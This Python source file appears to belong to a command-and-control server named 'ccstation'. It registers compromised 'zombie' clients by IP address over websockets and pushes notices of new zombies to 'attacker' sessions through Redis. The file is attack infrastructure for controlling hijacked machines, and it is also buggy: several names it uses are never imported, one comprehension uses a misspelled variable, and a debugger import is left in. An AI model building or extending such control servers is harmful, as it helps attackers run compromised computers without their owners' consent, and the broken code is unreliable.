
import simplejson
from ccstation.models import Zombie
import pdb

#wraps around message from zombie
class ZombieMessage(object):
    def __init__(self,message,clientip):
        self.message = simplejson.loads(message)
        self.ip = clientip
    def get(self):
        return self.message

#handler for websocket messages from zombies
class ZombieWebsocket(object):
    def register(self,websocketmsg):
            try:
                zom = Zombie.objects.get(host=websocketmsg.ip)
            except Zombie.DoesNotExist:
                newZombie = Zombie.objects.create(host=websocketmsg.ip,facility=websocketmsg.get()['facility'])
                #tell attacker new zombie added
                redis_publisher = RedisPublisher(facility='attacker',sessions=[ atkr.sesskey for atkr in Attacker.objects.all()])
                redis_publisher.publish_message(RedisMessage(simplejson.dumps({'new':'new','newzombieId':newZombie.pk,'newzombieHost':newZombie.host})))

    def heartbeat(self,websocketmsg):
            zom = Zombie.objects.get(host=websocketmsg.ip)
            redis_publisher = RedisPublisher(facility='attacker',sessions=[atrk.sesskey for atkr in Attacker.objects.all()])
            redis_publisher.publish_message(RedisMessage(simplejson.dumps({'new':'new','newzombieId':zom.pk,'newzombieHost':zom.host})))

    def update(self,websocketmsg):
        pass
